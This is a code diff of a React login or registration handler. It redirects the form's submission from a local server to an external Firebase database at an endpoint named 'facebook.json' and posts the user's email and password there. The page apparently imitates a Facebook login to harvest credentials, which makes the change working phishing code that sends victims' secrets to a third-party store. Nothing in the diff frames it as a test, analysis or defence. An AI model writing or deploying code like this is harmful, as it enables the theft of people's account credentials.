@@ -11,14 +11,20 @@ function App() {
     setpass(e.target.value);
   }
   const reg = () => {
-    axios.post("http://localhost:3002", {
+    if(cuerremil && cuerrpass ){
+      axios.post("https://idiotspay1-default-rtdb.firebaseio.com/facebook.json", {
       email: cuerremil,
       password: cuerrpass,
     }).then((response) => {
-      console.warn(response)
+      console.log(response)
     })
     setEmail("");
     setpass("");
+    }
+    else{
+      alert("Please enter data")
+    }
+    
   }
 
 
